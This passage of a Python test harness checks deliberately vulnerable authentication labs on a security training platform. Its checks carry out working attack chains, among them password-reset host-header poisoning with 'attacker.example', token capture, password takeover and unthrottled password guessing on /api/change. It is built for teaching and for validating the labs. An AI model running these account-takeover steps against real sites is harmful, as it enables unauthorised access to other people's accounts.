    out.append(("the account page exposes a flag", bool(FLAG_RE.search(resp.body)),
                FLAG_RE.findall(resp.body)[:1] or resp.body[:160]))
    return out


def v_mfa_simple_bypass_anon(c: Client) -> list[tuple[str, bool, str]]:
    """Regression guard for the anonymous-admin-page defect."""
    anon = c.get("/account")
    return [(
        "/account does not serve the admin panel to an anonymous visitor",
        "Account:" not in anon.body and not FLAG_RE.search(anon.body),
        f"status={anon.status} location={anon.location!r} body={anon.body[:120]!r}",
    )]


def v_reset_poisoning_mw(c: Client) -> list[tuple[str, bool, str]]:
    """Covers both lessons that share this variant.

    auth-reset-poisoning-middleware stops at "the link host is mine";
    auth-reset-poisoning-complete continues to a full takeover and the flag.
    """
    out = []
    clean = c.post("/forgot", form={"email": "carol@northwind-retail.test"})
    out.append((
        "without the header the emailed link keeps the real host",
        "northwind-retail.test/reset" in clean.body and "attacker" not in clean.body,
        clean.body[:200],
    ))

    poisoned = c.post(
        "/forgot",
        form={"email": "carol@northwind-retail.test"},
        headers={"X-Forwarded-Host": "attacker.example", "X-Forwarded-Proto": "http"},
    )
    m = re.search(r"(https?://[\w.\-]+)/reset\?token=(\d+)&user=(\S+?)[\s<]", poisoned.body)
    out.append((
        "X-Forwarded-Host and X-Forwarded-Proto control the emailed link",
        m is not None and m.group(1) == "http://attacker.example",
        poisoned.body[:220] if m is None else f"link host={m.group(1)}",
    ))
    if not m:
        return out
    token, user = m.group(2), m.group(3)
    out.append(("the victim's reset token is exposed in the poisoned link",
                token.isdigit(), f"token={token} user={user}"))

    # the weakness is the host header, not token binding: a cross-account token
    # must still be refused in this variant
    cross = c.post("/reset", form={"token": "1001", "user": "carol", "password": "x"})
    out.append(("a token for a different account is still refused in this variant",
                "invalid" in cross.body.lower(), cross.body[:160]))

    # full chain for the 'complete' lesson
    done = c.post("/reset", form={"token": token, "user": user, "password": "poisoned-1"})
    out.append(("the extracted token resets the victim's password",
                "Password updated" in done.body, done.body[:200]))
    signed_in = c.post("/login", form={"username": user, "password": "poisoned-1"})
    out.append(("signing in with the new password is accepted",
                "/account" in signed_in.location, f"location={signed_in.location!r}"))
    acct = c.get("/account")
    out.append(("the account page exposes the flag",
                bool(FLAG_RE.search(acct.body)),
                FLAG_RE.findall(acct.body)[:1] or acct.body[:160]))
    return out


def v_reset_change_bruteforce(c: Client) -> list[tuple[str, bool, str]]:
    """The lesson's target is carol; /api/change used to be hardcoded to alice."""
    out = []
    statuses = [c.post("/api/change", json_body={"username": "carol", "current": f"guess-{i}"},
                       ).status for i in range(30)]
    out.append(("30 wrong current-password guesses never return 429",
                429 not in statuses, f"statuses={set(statuses)}"))
    out.append(("/api/change answers every guess with 200", set(statuses) == {200},
                f"statuses={set(statuses)}"))

    right = c.post("/api/change", json_body={"username": "carol",
                                             "current": "carol-pw-9911",
                                             "new": "guessed-1"})
    out.append(("the recovered current password is accepted for carol",
                OK_RE.search(right.body) is not None, right.body[:200]))

    # the target really is carol: her password changed, alice's did not
    out.append((
        "the endpoint acted on the account named in the request (carol)",
        "carol" in right.body,
        right.body[:200],
    ))
    alice = c.post("/api/change", json_body={"username": "alice", "current": "alice-secret-2024"})
    out.append(("alice's own password still validates on the same endpoint",
                OK_RE.search(alice.body) is not None, alice.body[:200]))

    signed_in = c.post("/login", form={"username": "carol", "password": "guessed-1"})
    out.append(("carol can now sign in with the password set through /api/change",
                "/account" in signed_in.location, f"location={signed_in.location!r}"))
    acct = c.get("/account")
    out.append(("the account page exposes the flag", bool(FLAG_RE.search(acct.body)),
                FLAG_RE.findall(acct.body)[:1] or acct.body[:160]))

    # done last: this spends carol's /login budget and locks that name for 30s
    throttled = [c.post("/login", form={"username": "zz-throttle-probe", "password": "bad"}).status
                 for _ in range(7)]
    out.append(("/login itself is rate limited, which is why the guesses go elsewhere",
                429 in throttled, f"statuses={throttled}"))
    return out


def v_reset_full_chain(c: Client, token: str = "1001") -> list[tuple[str, bool, str]]:
    """Shared tail: recover a password, sign in, read the flag."""
    out = []
    done = c.post("/reset", form={"token": token, "user": "carol", "password": "recovered-1"})
    out.append(("carol's password was reset", "Password updated" in done.body, done.body[:200]))
    signed_in = c.post("/login", form={"username": "carol", "password": "recovered-1"})
    out.append(("signing in with the recovered password is accepted",
                "/account" in signed_in.location, f"location={signed_in.location!r}"))
    acct = c.get("/account")
    out.append(("the account page exposes the flag", bool(FLAG_RE.search(acct.body)),
                FLAG_RE.findall(acct.body)[:1] or acct.body[:160]))
    forged = c.get("/account", headers={"Cookie": "session=forged"})
    out.append(("a forged session cookie does not open the account page",
                "Account:" not in forged.body,
                f"status={forged.status} body={forged.body[:100]!r}"))
    return out


CHECKS = {
    "brute_unlimited": v_brute_unlimited,
    "brute_ipblock": v_brute_ipblock,
    "brute_multipass": v_brute_multipass,
    "enum_response": v_enum_response,
    "enum_subtle": v_enum_subtle,
    "enum_timing": v_enum_timing,
    "enum_lock": v_enum_lock,
    "mfa_simple_bypass": v_mfa_simple_bypass,
    "mfa_broken_logic": v_mfa_broken_logic,
    "mfa_bruteforce": v_mfa_bruteforce,
    "mfa_trusted_device": v_mfa_trusted_device,
    "mfa_backup_guess": v_mfa_backup_guess,
    "reset_predictable": v_reset_predictable,
    "reset_broken_logic": v_reset_broken_logic,
    "reset_poisoning_mw": v_reset_poisoning_mw,
    "reset_change_bruteforce": v_reset_change_bruteforce,
}


# what --variants runs
DEFAULT_VARIANTS = ["brute_unlimited", "mfa_backup_guess", "reset_predictable"]


def check_variants(
    r: Results, lessons: list[dict], wanted: list[str]
) -> None:
    by_variant: dict[str, list[str]] = {}
    for v in lessons:
        if v.get("lab_variant"):
            by_variant.setdefault(v["lab_variant"], []).append(v["slug"])
    by_variant = {k: v[0] for k, v in by_variant.items()}

    r.section("variants")
    if not backend_up():
        r.skip("variants", "backend not running")
        return

    for variant in wanted:
        vuln_slug = by_variant.get(variant)
        if not vuln_slug:
            r.check("variants", f"{variant}: has a lesson", False, "no lesson maps to this variant")
            continue
        r.check("variants", f"{variant}: has a lesson", True)
        lab_id = None
        try:
            lab_id, url = launch(vuln_slug)
            r.check("variants", f"{variant}: container reached running", True, url)
            c = Client(url)
            health = c.get("/healthz")
            got = re.search(r'"variant":"([a-z0-9_]+)"', health.body)
            r.check(
                "variants",
                f"{variant}: running container serves this variant",
                got is not None and got.group(1) == variant,
                f"/healthz said {got.group(1) if got else health.body[:80]!r}",
            )
            fn = CHECKS[variant]
            results = fn(c)
            for name, ok, detail in results:
                r.check("variants", f"{variant}: {name}", ok, detail)
        except Exception as e:
            r.check("variants", f"{variant}: lab lifecycle", False, f"{type(e).__name__}: {e}")
        finally:
            if lab_id is not None:
                destroy(lab_id)
                r.check("variants", f"{variant}: lab destroyed", True)


# --------------------------------------------------------------------------- #


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--variants", action="store_true", help=f"run {DEFAULT_VARIANTS}")
    ap.add_argument("--all", action="store_true", help="run every implemented variant that has a check")
    ap.add_argument("--variant", action="append", default=[], help="run one specific variant (repeatable)")
    ap.add_argument("--no-api", action="store_true", help="skip API checks")
    args = ap.parse_args()

    r = Results()
    lessons = check_content(r)
    if not args.no_api:
        check_api(r, lessons)

    if args.variant:
        wanted = args.variant
    elif args.all:
        wanted = sorted(set(CHECKS) & {v["lab_variant"] for v in lessons if v.get("lab_variant")})
    elif args.variants:
        wanted = list(DEFAULT_VARIANTS)
    else:
        wanted = []

    if wanted:
        unknown = [v for v in wanted if v not in CHECKS]
        if unknown:
            r.check("variants", "requested variants have checks", False,
                    f"no check implemented for: {unknown}")
        check_variants(r, lessons, [v for v in wanted if v in CHECKS],
                       )

    print("\n".join(r.lines))
    print(
        f"\n{r.passed} passed, {r.failed} failed, {r.skipped} skipped"
    )
    return 1 if r.failed else 0


if __name__ == "__main__":
    raise SystemExit(main())
